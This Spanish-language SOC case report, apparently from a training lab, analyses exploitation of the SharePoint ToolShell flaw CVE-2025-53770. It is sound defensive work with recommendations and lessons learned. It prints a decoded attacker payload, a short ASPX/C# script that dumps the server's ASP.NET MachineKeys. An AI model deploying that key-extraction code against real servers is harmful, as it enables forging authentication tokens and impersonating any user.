// CASE-004 · SOC342 True Positive Cerrado Critical

CVE-2025-53770 ToolShell —
Auth Bypass + RCE en SharePoint Server

Explotación de zero-day crítico en SharePoint Server on-premises. El atacante aprovechó CVE-2025-53770 para ejecutar código sin autenticación, extraer MachineKeys del servidor, compilar un payload .NET y desplegar una webshell persistente en la infraestructura comprometida.

// 01_resumen

Resumen ejecutivo

El sistema de detección activó la regla SOC342 al identificar una solicitud POST no autenticada contra ToolPane.aspx en el servidor SharePoint01 (172.16.20.17), proveniente de 107.191.58.76 — IP clasificada como maliciosa en VirusTotal (malware y phishing, 12/91 motores).

El análisis de procesos confirmó explotación exitosa: el proceso w3wp.exe (IIS Worker Process) generó un hijo PowerShell que ejecutó un script en Base64 para extraer las MachineKeys del servidor. Posteriormente se compiló un payload .NET y se desplegó una webshell (spinstall0.aspx) en la carpeta LAYOUTS de SharePoint, otorgando al atacante acceso persistente al servidor.

// veredicto — compromiso confirmado

True Positive crítico. Explotación exitosa de CVE-2025-53770 con RCE confirmado, extracción de MachineKeys, compilación de payload y webshell desplegada. El servidor SharePoint01 debe considerarse completamente comprometido. Requiere aislamiento inmediato, análisis forense completo y rotación de todas las credenciales y claves criptográficas del entorno.

// 04_payload

Análisis del payload PowerShell

El comando PowerShell ejecutado contenía un script en Base64. Decodificado con CyberChef revela su propósito: extraer las MachineKeys de ASP.NET del servidor SharePoint.

// Decodificado desde Base64 — CyberChef

<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server" language="c#" CODEPAGE="65001">
  public void Page_load()
  {
    var sy = System.Reflection.Assembly.Load("System.Web...");
    var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
    var gac = mkt.GetMethod("GetApplicationConfig", BindingFlags.Static | NonPublic);
    var cg = (MachineKeySection)gac.Invoke(null, new object[0]);
    Response.Write(
      cg.ValidationKey + "|" +
      cg.DecryptionKey + "|" +
      cg.CompatibilityMode
    );
  }
</script>

Este script extrae y expone las ValidationKey y DecryptionKey — las claves criptográficas que SharePoint usa para firmar y cifrar tokens de sesión. Con estas claves el atacante puede forjar tokens de autenticación válidos para cualquier usuario del sistema, incluyendo administradores de SharePoint y de dominio.

Acciones tomadas

01

Verificación de la IP atacante: 107.191.58.76 confirmada como maliciosa en VirusTotal (malware + phishing, 12/91). Sin registros de ejercicio o pentest programado en correos del período.

02

Análisis de la solicitud HTTP: POST a ToolPane.aspx con payload de 7699 bytes y referer falsificado (SignOut.aspx) — patrón documentado de explotación de CVE-2025-53770.

03

Análisis de cadena de procesos: w3wp.exe generando PowerShell hijo confirma RCE exitoso. Script Base64 decodificado con CyberChef revela extracción de MachineKeys.

04

Identificación de webshell: spinstall0.aspx localizado en carpeta LAYOUTS de SharePoint. Hash verificado en VirusTotal — 43/59 detecciones maliciosas. No se encontró propagación a otros endpoints.

05

Clasificación: True Positive confirmado — explotación de zero-day con RCE, extracción de claves criptográficas, compilación de payload y persistencia establecida.

Punto de mejora identificado: El proceso de verificación de ejercicios programados requiere búsqueda exhaustiva en el sistema de correo usando múltiples filtros — IP atacante, IP víctima, nombre del host, código CVE y nombre de archivos involucrados. // 09_recomendaciones

Recomendaciones

  • Aislamiento inmediato de SharePoint01 — el servidor debe considerarse completamente comprometido
  • Eliminar webshell spinstall0.aspx de la carpeta LAYOUTS y auditar toda la carpeta en busca de archivos adicionales no autorizados
  • Rotar todas las MachineKeys de ASP.NET — las ValidationKey y DecryptionKey fueron expuestas, permitiendo forjar tokens de sesión
  • Invalidar todas las sesiones activas de SharePoint — los tokens existentes pueden haber sido comprometidos
  • Aplicar el parche de Microsoft para CVE-2025-53770 de forma urgente en todos los servidores SharePoint on-premises del entorno
  • Análisis forense completo del servidor para determinar si se produjo movimiento lateral usando los tokens forjados
  • Revisar logs de acceso a SharePoint buscando sesiones autenticadas originadas desde 107.191.58.76 o con tokens generados tras el compromiso
  • Implementar WAF con reglas específicas para bloquear patrones de explotación de ToolPane.aspx

// 10_lecciones

Lecciones aprendidas

w3wp.exe generando PowerShell es siempre sospechoso. Un proceso IIS Worker nunca debería tener PowerShell como proceso hijo en condiciones normales. Esta relación padre-hijo es una señal de alarma inmediata de RCE en servidores web.

Base64 en comandos PowerShell requiere decodificación obligatoria. El uso de -EncodedCommand es una técnica de ofuscación común. Siempre decodificar con CyberChef o similar para entender el impacto real del comando ejecutado.

Las MachineKeys comprometidas son un riesgo crítico de autenticación. Con ValidationKey y DecryptionKey expuestas, el atacante puede impersonar a cualquier usuario. La rotación de claves y la invalidación de sesiones son pasos no opcionales.

LOLBIN con csc.exe evade muchos controles. Usar el compilador C# legítimo de Microsoft para generar malware en tiempo de ejecución es una técnica avanzada que bypasea soluciones que confían en binarios firmados.

La verificación de ejercicios programados debe ser exhaustiva. Buscar por IP, hostname, CVE y nombres de archivo. Documentar explícitamente la ausencia de resultados antes de clasificar — no basta con una búsqueda superficial.

Una webshell en LAYOUTS significa persistencia real. El atacante no necesita reexplotar nada — tiene acceso HTTP directo al servidor. La eliminación del archivo y auditoría de la carpeta son prioritarias en la respuesta.
